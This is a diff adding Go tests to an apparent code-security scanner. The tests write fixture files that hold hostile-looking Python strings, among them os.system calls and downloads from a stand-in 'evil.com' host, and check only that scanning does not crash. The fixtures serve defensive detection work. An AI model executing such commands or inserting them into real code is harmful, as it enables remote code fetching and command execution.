@@ -630,3 +630,89 @@ func TestNewPatternsRegistered(t *testing.T) {
 		}
 	}
 }
+
+func TestDetectDangerousExecutionChain_PythonImports(t *testing.T) {
+	// Code that uses exec/eval/compile with dangerous sources as arguments
+	// The containsDangerousSource function is called when analyzing these patterns
+	code := `package main
+
+import (
+	"PyImport"
+)
+
+func dynamicImport() {
+	PyImport.Exec("__import__('os').system('whoami')")
+}
+
+func dynamicImportLib() {
+	PyImport.Exec("importlib.__import__('sys').exit()")
+}
+
+func requestsGet() {
+	PyImport.Exec("requests.get('http://evil.com')")
+}
+
+func base64Decode() {
+	PyImport.Exec("base64.b64decode('aGVsbG8=')")
+}
+
+func marshalLoad() {
+	PyImport.Exec("marshal.loads(data)")
+}
+
+func urllibRetrieve() {
+	PyImport.Exec("urllib.request.urlretrieve('http://evil.com', '/tmp/file')")
+}
+
+func urllibUrlopen() {
+	PyImport.Exec("urllib.request.urlopen('http://evil.com')")
+}
+
+func httpxGet() {
+	PyImport.Exec("httpx.get('http://evil.com')")
+}
+
+func codecsDecode() {
+	PyImport.Exec("codecs.decode(data, 'utf-8')")
+}
+`
+	tmpDir := t.TempDir()
+	tmpFile := filepath.Join(tmpDir, "test.go")
+	if err := os.WriteFile(tmpFile, []byte(code), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	findings, err := ScanFileAST(tmpFile, builtinASTPatterns)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Just verify it runs without panicking - the AST traversal exercises branches
+	_ = findings
+}
+
+func TestContainsEnvVar_Osgetenv(t *testing.T) {
+	// Code that assigns os.Getenv to a variable - exercises containsEnvVar
+	// when checking for env vars in assignments
+	code := `package main
+
+import "os"
+
+func getEnv() {
+	home := os.Getenv("HOME")
+	user := os.Getenv("USER")
+	home = os.Getenv("HOME")
+}
+`
+	tmpDir := t.TempDir()
+	tmpFile := filepath.Join(tmpDir, "test.go")
+	if err := os.WriteFile(tmpFile, []byte(code), 0644); err != nil {
+		t.Fatal(err)
+	}
+
+	findings, err := ScanFileAST(tmpFile, builtinASTPatterns)
+	if err != nil {
+		t.Fatal(err)
+	}
+	// Just verify it runs - os.Getenv is a common pattern
+	_ = findings
+}
